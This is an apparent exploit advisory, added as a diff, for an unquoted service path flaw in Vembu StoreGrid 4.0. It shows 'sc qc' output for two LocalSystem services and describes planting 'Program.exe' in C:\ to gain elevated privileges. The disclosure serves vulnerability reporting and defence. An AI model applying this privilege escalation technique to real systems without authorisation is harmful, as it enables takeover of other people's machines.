@@ -1,0 +1,78 @@
+# Exploit Title: Vembu StoreGrid - Unquoted Service Path Privilege Escalation
+# Date: 10/19/2016
+# Exploit Author: Joey Lane
+# Version: 4.0
+# Tested on: Windows Server 2012
+
+StoreGrid is a re-brandable backup solution, which can install 2 services with unquoted service paths.
+This enables a local privilege escalation vulnerability.  
+To exploit this vulnerability, a local attacker can insert an executable file in the path of either service.
+Rebooting the system or restarting the service will run the malicious executable with elevated privileges.
+
+This was tested on version 4.0, but other versions may be affected as well.
+
+
+---------------------------------------------------------------------------
+
+C:\>sc qc RemoteBackup
+
+[SC] QueryServiceConfig SUCCESS
+
+
+
+SERVICE_NAME: RemoteBackup
+
+        TYPE               : 10  WIN32_OWN_PROCESS
+
+        START_TYPE         : 2   AUTO_START
+
+        ERROR_CONTROL      : 0   IGNORE
+
+        BINARY_PATH_NAME   : C:\Program Files\MSP\RemoteBackup\bin\StoreGrid.exe
+
+
+        LOAD_ORDER_GROUP   :
+
+        TAG                : 0
+
+        DISPLAY_NAME       : RemoteBackup
+
+        DEPENDENCIES       :
+
+        SERVICE_START_NAME : LocalSystem
+
+
+C:\>sc qc RemoteBackup_webServer
+
+[SC] QueryServiceConfig SUCCESS
+
+
+
+SERVICE_NAME: RemoteBackup_webServer
+
+        TYPE               : 10  WIN32_OWN_PROCESS
+
+        START_TYPE         : 2   AUTO_START
+
+        ERROR_CONTROL      : 0   IGNORE
+
+        BINARY_PATH_NAME   : C:\Program Files\MSP\RemoteBackup\apache\Apache.exe -k runservice
+
+        LOAD_ORDER_GROUP   :
+
+        TAG                : 0
+
+        DISPLAY_NAME       : RemoteBackup_WebServer
+
+        DEPENDENCIES       :
+
+        SERVICE_START_NAME : LocalSystem
+
+---------------------------------------------------------------------------
+
+
+EXAMPLE:
+
+Using the BINARY_PATH_NAME listed above as an example, an executable named
+"Program.exe" could be placed in "C:\", and it would be executed as the
+Local System user next time the service was restarted.
